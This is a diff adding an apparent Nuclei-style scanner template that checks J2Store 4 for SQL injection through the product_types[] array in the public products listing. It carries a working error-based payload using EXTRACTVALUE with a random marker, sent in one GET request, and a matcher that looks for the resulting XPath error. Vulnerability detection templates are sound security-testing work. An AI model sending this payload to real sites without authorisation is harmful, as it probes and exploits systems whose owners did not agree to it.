@@ -1,0 +1,43 @@
+id: j2store-4-product-types-sqli
+
+info:
+  name: J2Store 4 - Frontend Product Types Array SQL Injection
+  author: melina
+  severity: high
+  description: |
+    Tests the product_types[] model-state fallback in the public products
+    listing, reviewed against J2Store v4.0.5. The array is joined into an SQL
+    IN clause without escaping its elements. Requires an accessible storefront
+    and a MySQL/MariaDB version with EXTRACTVALUE and visible database errors.
+    Uses a random error marker without reading application tables and sets
+    savestate=0. Keep the installation subpath in BaseURL; if menu context is
+    required, add a confirmed Itemid to a workspace copy of the template.
+    This source-derived check has not been verified against a full deployment.
+    A negative result does not establish that the installation is patched.
+  reference:
+    - https://github.com/J2Store4/j2store4/blob/v4.0.5/administrator/components/com_j2store/models/products.php
+    - https://github.com/J2Store4/j2store4/blob/v4.0.5/fof/model/model.php
+    - https://github.com/J2Store4/j2store4/blob/v4.0.5/components/com_j2store/controllers/products.php
+  classification:
+    cwe-id: CWE-89
+  metadata:
+    verified: false
+    max-request: 1
+    vendor: j2store
+    product: j2store
+  tags: joomla,j2store,sqli,fof,ctf
+
+variables:
+  marker: "{{randstr_1}}"
+  injection: >-
+    simple') AND EXTRACTVALUE(1,CONCAT(0x7e,0x{{hex_encode(marker)}},0x7e)) AND ('1'='1
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?option=com_j2store&view=products&task=browse&savestate=0&product_types%5B%5D={{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body, concat('~', marker, '~')) && contains(tolower(body), 'xpath syntax error')"
